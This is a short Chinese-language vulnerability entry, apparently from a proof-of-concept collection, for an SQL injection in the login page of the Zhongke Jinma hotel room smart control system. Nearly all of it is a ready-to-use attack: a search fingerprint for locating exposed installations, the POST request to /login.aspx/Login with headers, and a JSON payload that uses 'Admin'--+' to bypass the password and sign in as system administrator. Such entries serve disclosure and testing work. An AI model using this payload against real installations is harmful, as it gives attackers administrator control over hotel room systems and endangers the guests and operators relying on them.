# 中科金马酒店客房智能控制系统Login存在SQL注入漏洞

- **系统**：中科金马酒店客房智能控制系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="login.aspx/Get_usertype"`
- **请求**：`POST /login.aspx/Login HTTP/1.1`
- **关键头**：`Content-Type: application/json; charset=utf-8`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 68`　`Cookie: ASP.NET_SessionId=35qu3tpakzbtd0vfau5rl5zk`　`Priority: u=0`

**请求体 / payload**
```
{UserName: "Admin'--+",Password:"123456",TypeName:"系统管理员"}
```
- **预期**：200　|　—